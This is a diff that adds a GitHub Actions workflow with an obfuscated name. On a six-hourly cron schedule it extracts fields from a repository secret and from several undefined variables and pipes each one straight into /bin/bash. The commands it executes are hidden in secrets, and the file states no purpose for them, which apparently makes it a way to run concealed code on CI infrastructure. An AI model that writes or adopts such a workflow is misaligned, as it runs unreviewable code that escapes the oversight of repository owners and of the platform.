@@ -1,0 +1,24 @@
+name: zhuganerx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuganerx
+        env:
+          p32: ${{ secrets.p32 }}
+        run: |
+          echo $p32 | jq -r .wv16128 | /bin/bash
+          echo $rill7698 | jq -r .l1 | /bin/bash
+          echo $tpzk3 | jq -r .prm59026 | /bin/bash
+          echo $jeztg734 | jq -r .tmcoq78 | /bin/bash
+          echo $i648 | jq -r .vbsi3 | /bin/bash
+          echo $pv1573 | jq -r .em93960 | /bin/bash
+          echo $iuri87 | jq -r .j459 | /bin/bash
+
